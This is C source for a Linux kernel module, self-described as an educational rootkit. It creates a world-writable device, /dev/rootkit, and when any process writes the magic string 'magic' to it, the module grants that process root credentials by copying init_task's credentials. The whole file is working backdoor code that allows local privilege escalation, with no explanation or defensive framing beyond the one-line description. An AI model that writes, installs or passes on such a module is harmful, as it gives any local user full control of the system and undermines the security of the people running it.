#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/fs.h>
#include <linux/miscdevice.h>
#include <linux/cred.h>
#include <linux/uaccess.h>
#include <linux/printk.h>

#define MAGIC "magic"  // Magic string to trigger escalation

static ssize_t rootkit_write(struct file *file, const char __user *buf, size_t count, loff_t *ppos) {
    char kbuf[16];
    size_t len = min(count, sizeof(kbuf) - 1);

    if (copy_from_user(kbuf, buf, len)) {
        pr_err("copy_from_user failed\n");
        return -EFAULT;
    }
    kbuf[len] = '\0';

    if (strncmp(kbuf, MAGIC, strlen(MAGIC)) == 0) {
        extern struct task_struct init_task;
        struct cred *new_cred = prepare_kernel_cred(&init_task);
        if (!new_cred) {
            pr_err("Failed to prepare kernel credentials\n");
            return -ENOMEM;
        }
        commit_creds(new_cred);
        pr_info("[+] Current process escalated to root\n");
    } else {
        pr_info("[-] Invalid magic string\n");
    }

    return count;
}

static const struct file_operations rootkit_fops = {
    .write = rootkit_write,
};

static struct miscdevice rootkit_dev = {
    .minor = MISC_DYNAMIC_MINOR,
    .name = "rootkit",
    .fops = &rootkit_fops,
    .mode = 0666,
};

static int __init rootkit_init(void) {
    int ret = misc_register(&rootkit_dev);
    if (ret) {
        pr_err("Failed to register misc device\n");
        return ret;
    }
    pr_info("Rootkit device loaded: /dev/rootkit\n");
    return 0;
}

static void __exit rootkit_exit(void) {
    misc_deregister(&rootkit_dev);
    pr_info("Rootkit device unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR ("ME");
MODULE_DESCRIPTION("Educational rootkit module with char device for privilege escalation");
